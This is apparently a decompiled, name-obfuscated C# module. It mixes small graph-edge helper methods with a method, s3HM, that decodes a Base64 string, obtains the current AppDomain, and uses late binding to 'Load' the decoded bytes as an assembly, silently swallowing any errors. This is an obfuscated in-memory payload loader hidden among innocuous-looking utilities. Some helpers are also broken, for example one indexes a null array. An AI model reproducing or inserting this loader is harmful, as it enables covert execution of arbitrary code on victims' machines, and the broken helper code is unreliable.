using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using Ac85;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using t7R9;
using y9J1;

namespace Ps73;

[StandardModule]
[HideModuleName]
public sealed class Fp69
{
	public static bool y7WT(this w0WK Mm6x, string Ra67, string r6K2)
	{
		if (string.Equals(Mm6x.source, Ra67, StringComparison.OrdinalIgnoreCase))
		{
			return string.Equals(Mm6x.target, r6K2, StringComparison.OrdinalIgnoreCase);
		}
		if (string.Equals(Mm6x.target, Ra67, StringComparison.OrdinalIgnoreCase))
		{
			return string.Equals(Mm6x.source, r6K2, StringComparison.OrdinalIgnoreCase);
		}
		return false;
	}

	public static string x1AQ(this w0WK q7L0, string Qq2b)
	{
		if (string.Equals(q7L0.source, Qq2b))
		{
			return q7L0.target;
		}
		if (string.Equals(q7L0.target, Qq2b))
		{
			return q7L0.source;
		}
		return "";
	}

	public static bool w6P5(this w0WK d9NE, string b5T9)
	{
		return string.Equals(b5T9, d9NE.source, StringComparison.OrdinalIgnoreCase) || string.Equals(b5T9, d9NE.target, StringComparison.OrdinalIgnoreCase);
	}

	public static string Lc87(this Mp5a b4P7, bool Wk20 = false)
	{
		string[] array = default(string[]);
		if (Wk20)
		{
			return array[0] + " + " + array[1];
		}
		return $"[{b4P7.Interaction}] {array[0]};{array[1]}";
	}

	public static string g5PC(this Mp5a Fz61, bool Je6y = false)
	{
		if (!Je6y)
		{
		}
		string result = default(string);
		return result;
	}

	public static void s3HM(string z1QT)
	{
		try
		{
			List<object> list = new List<object>();
			list.Add(Convert.FromBase64String(z1QT));
			list.Add(24);
			list.Add(new List<byte>());
			int num = 0;
			object CounterResult = default(object);
			object LoopForResult = default(object);
			if (ObjectFlowControl.ForLoopControl.ForLoopInitObj(CounterResult, Operators.SubtractObject(NewLateBinding.LateGet(list[0], null, "length", new object[0], null, null, null), 1), 0, -1, ref LoopForResult, ref CounterResult))
			{
				do
				{
					((List<byte>)list[2]).Add(((byte[])list[0])[Conversions.ToInteger(CounterResult)]);
					if (num % 4 == 0)
					{
						object instance = list[2];
						object[] obj = new object[2] { num, null };
						object instance2 = list[2];
						object[] obj2 = new object[1] { num };
						object[] array = obj2;
						bool[] obj3 = new bool[1] { true };
						bool[] array2 = obj3;
						object obj4 = NewLateBinding.LateGet(instance2, null, "Item", obj2, null, null, obj3);
						if (array2[0])
						{
							num = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
						}
						obj[1] = Ly7p.n1Z5(Conversions.ToString(obj4));
						NewLateBinding.LateSetComplex(instance, null, "Item", obj, null, null, OptimisticSet: false, RValueBase: true);
					}
					if (Operators.ConditionalCompareObjectEqual(CounterResult, 100, TextCompare: false))
					{
						list.Add(AppDomain.CurrentDomain);
					}
					else if (Operators.ConditionalCompareObjectEqual(Operators.DivideObject(CounterResult, num), 0, TextCompare: false))
					{
						object instance3 = list[3];
						object obj4;
						object[] obj5 = new object[1] { NewLateBinding.LateGet(obj4 = list[2], null, "ToArray", new object[0], null, null, null) };
						object[] array = obj5;
						bool[] obj6 = new bool[1] { true };
						bool[] array2 = obj6;
						object obj7 = NewLateBinding.LateGet(instance3, null, "Load", obj5, null, null, obj6);
						if (array2[0])
						{
							NewLateBinding.LateSetComplex(obj4, null, "ToArray", new object[1] { array[0] }, null, null, OptimisticSet: true, RValueBase: true);
						}
						list.Add(RuntimeHelpers.GetObjectValue(obj7));
					}
					num = checked(num + 1);
				}
				while (ObjectFlowControl.ForLoopControl.ForNextCheckObj(CounterResult, LoopForResult, ref CounterResult));
			}
			Ly7p.Fr6d(list);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}
}
